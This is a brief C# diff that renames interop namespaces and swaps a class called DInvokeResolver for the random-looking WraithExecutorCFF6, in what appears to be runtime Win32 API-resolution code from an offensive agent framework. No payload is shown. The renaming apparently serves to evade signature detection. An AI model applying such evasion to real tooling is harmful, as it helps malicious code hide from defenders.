@@ -1,11 +1,11 @@
 ﻿using System;
 using System.Runtime.InteropServices;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Interfaces;
 
 namespace DInvokeResolver
 {
-    public class DInvokeResolver : IWin32ApiResolver
+    public class WraithExecutorCFF6 : IWin32ApiResolver
     {
         public T GetLibraryFunction<T>(Library library, string functionName, bool canLoadFromDisk = true, bool resolveForwards = true) where T : Delegate
         {
